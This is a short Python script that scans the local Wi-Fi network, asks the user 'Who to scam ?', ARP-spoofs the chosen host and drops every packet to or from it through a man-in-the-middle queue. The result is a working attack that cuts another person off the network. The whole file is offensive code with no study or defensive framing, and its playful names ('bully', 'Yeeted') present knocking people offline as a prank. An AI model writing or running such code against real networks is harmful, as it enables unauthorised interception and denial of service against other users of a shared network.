import nifty.network.arp as arp
import nifty.config as config
from nifty.network.utils import MITM
from netfilterqueue import Packet
from scapy.all import IP

config.interface = "wlan1"

targets = arp.arp_scan()
for i in range(len(targets)):
    print(f"{i} - {targets[i]}")

ans = int(input("Who to scam ? "))
target = targets[ans]
print(f"Target: {target}")

a = arp.ARPSpoofer(target)

a.start()

def bully(pkt: Packet):
    global target
    spkt = IP(pkt.get_payload())
    ip_src=spkt[IP].src
    ip_dst=spkt[IP].dst
    if (ip_src == target.ip or ip_dst == target.ip):
        print("Yeeted ", pkt)
        pkt.drop()
    else:
        pkt.accept()


MITM.start(bully)
a.stop()